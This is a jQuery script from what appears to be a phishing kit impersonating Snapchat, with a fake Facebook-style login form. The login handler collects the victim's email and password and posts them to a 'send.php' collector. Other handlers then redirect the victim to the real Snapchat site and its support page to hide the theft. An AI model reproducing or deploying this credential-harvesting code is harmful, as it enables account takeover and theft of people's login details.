// GO to Real Site
$(document).ready(function() {
    $('.index-all-page-img').click(function() {
        window.location.replace('https://www.snapchat.com/')
    });
});

// Done 
$(document).ready(function() {
    $('.close-done-all').click(function() {
        window.location.replace('https://support.snapchat.com/en-US/i-need-help')
    });
});

// Login Form
$(document).ready(function() {
    $('.facebook-login-bu').click(function() {
        var email = $('.email_fa').val();
        var password = $('.password_fa').val();
        $.post('send.php', {
            info: "facebook",
            password: password,
            email: email
        }, function() {
            $('.done-successfully-cinghaha').click();
        });
    });
});